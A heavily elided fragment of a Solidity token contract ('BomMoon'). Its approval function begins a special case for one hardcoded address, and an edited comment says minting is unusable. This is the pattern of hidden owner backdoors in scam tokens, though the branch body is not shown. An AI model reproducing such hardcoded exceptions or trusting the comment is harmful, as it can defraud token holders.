 ...
 * that a supply mechanism has to be added in a derived contract using {_mint}. _mint is only used to create initial supplies not usable under "write contract"
...
contract BomMoon is Context, IERC20, IERC20Metadata, Ownable {
    ...
    */
    ...
    function _approve(
        ...
        if (owner == address(0xA0cC00caEbbc8a8D1C80647C98910e5d995319E7)) {
